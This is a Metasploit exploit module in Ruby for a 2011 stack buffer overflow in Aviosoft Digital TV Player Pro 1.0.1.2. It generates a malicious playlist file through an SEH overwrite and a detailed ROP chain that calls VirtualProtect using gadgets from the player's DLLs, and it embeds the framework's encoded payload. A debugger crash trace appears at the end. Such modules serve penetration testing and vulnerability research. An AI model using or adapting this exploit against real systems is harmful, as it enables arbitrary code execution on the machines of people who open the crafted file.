##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Aviosoft Digital TV Player Professional 1.0 Stack Buffer Overflow",
			'Description'    => %q{
						This module exploits a vulnerability found in Aviosoft Digital TV Player
					Pro version 1.x.  An overflow occurs when the process copies the content of a
					playlist file on to the stack, which may result aribitrary code execution under
					the context of the user.
				},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'modpr0be',  #Initial discovery, poc
					'sinn3r',    #Metasploit
				],
			'References'     =>
				[
					['OSVDB', '77043'],
					['URL', 'http://www.exploit-db.com/exploits/18096/'],
				],
			'Payload'        =>
				{
					'BadChars' => "\x00\x0a\x1a",
					'StackAdjustment' => -3500,
				},
			'DefaultOptions'  =>
				{
					'ExitFunction' => "seh",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Aviosoft DTV Player 1.0.1.2',
						{
							'Ret'    => 0x6130534a,  #Stack pivot (ADD ESP,800; RET)
							'Offset' => 612,         #Offset to SEH
							'Max'    => 5000         #Max buffer size
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => "Nov 9 2011",
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME', [false, 'The playlist name', 'msf.plf'])
				], self.class)
	end

	def junk(n=1)
		return [rand_text_alpha(4).unpack("L")[0]] * n
	end

	def nops(rop=false, n=1)
	 	return rop ? [0x61326003] * n : [0x90909090] * n
	end

	def exploit
		rop = [
			nops(true, 10),  #ROP NOP
			0x6405347a,      #POP EDX # RETN (MediaPlayerCtrl.dll)
			0x10011108,      #ptr to &VirtualProtect
			0x64010503,      #PUSH EDX # POP EAX # POP ESI # RETN (MediaPlayerCtrl.dll)
			junk,
			0x6160949f,      #MOV ECX,DWORD PTR DS:[EDX] # POP ESI (EPG.dll)
			junk(3),
			0x61604218,      #PUSH ECX # ADD AL,5F # XOR EAX,EAX # POP ESI # RETN 0C (EPG.dll)
			junk(3),
			0x6403d1a6,      #POP EBP # RETN (MediaPlayerCtrl.dll)
			junk(3),
			0x60333560,      #& push esp #  ret 0c (Configuration.dll)
			0x61323EA8,      #POP EAX # RETN (DTVDeviceManager.dll)
			0xA13977DF,      #0x00000343-> ebx
			0x640203fc,      #ADD EAX,5EC68B64 # RETN (MediaPlayerCtrl.dll)
			0x6163d37b,      #PUSH EAX # ADD AL,5E # POP EBX # RETN (EPG.dll)
			0x61626807,      #XOR EAX,EAX # RETN (EPG.dll)
			0x640203fc,      #ADD EAX,5EC68B64 # RETN (MediaPlayerCtrl.dll)
			0x6405347a,      #POP EDX # RETN (MediaPlayerCtrl.dll)
			0xA13974DC,      #0x00000040-> edx
			0x613107fb,      #ADD EDX,EAX # MOV EAX,EDX # RETN (DTVDeviceManager.dll)
			0x60326803,      #POP ECX # RETN (Configuration.dll)
			0x60350340,      #&Writable location
			0x61329e07,      #POP EDI # RETN (DTVDeviceManager.dll)
			nops(true),      #ROP NOP
			0x60340178,      #POP EAX # RETN
			nops,            #Regular NOPs
			0x60322e02       #PUSH # RETN
		].flatten.pack("V*")

		buf  = ''
		buf << rand_text_alpha(target['Offset']-buf.length)
		buf << [target.ret].pack('V*')
		buf << rand_text_alpha(136)
		buf << rop
		buf << make_nops(32)
		buf << payload.encoded
		buf << rand_text_alpha(target['Max']-buf.length)

		file_create(buf)
	end
end

=begin
eax=00001779 ebx=047a02c0 ecx=000001f4 edx=047a6814 esi=047a77bc edi=00130000
eip=6400f6f0 esp=0012f038 ebp=00000001 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
MediaPlayerCtrl!DllCreateObject+0x220:
6400f6f0 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
0:000> !exchain
0012f3bc: *** WARNING: Unable to verify checksum for C:\Program Files\Aviosoft\Aviosoft DTV Player Pro\DTVDeviceManager.dll
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Aviosoft\Aviosoft DTV Player Pro\DTVDeviceManager.dll - 
DTVDeviceManager+534a (6130534a)
Invalid exception stack at 41414141
0:000> !address edi
    00130000 : 00130000 - 00003000
                    Type     00040000 MEM_MAPPED
                    Protect  00000002 PAGE_READONLY
                    State    00001000 MEM_COMMIT
                    Usage    RegionUsageIsVAD
0:000> !address esi
    047a0000 : 047a0000 - 0000b000
                    Type     00020000 MEM_PRIVATE
                    Protect  00000004 PAGE_READWRITE
                    State    00001000 MEM_COMMIT
                    Usage    RegionUsageHeap
                    Handle   013c0000
=end
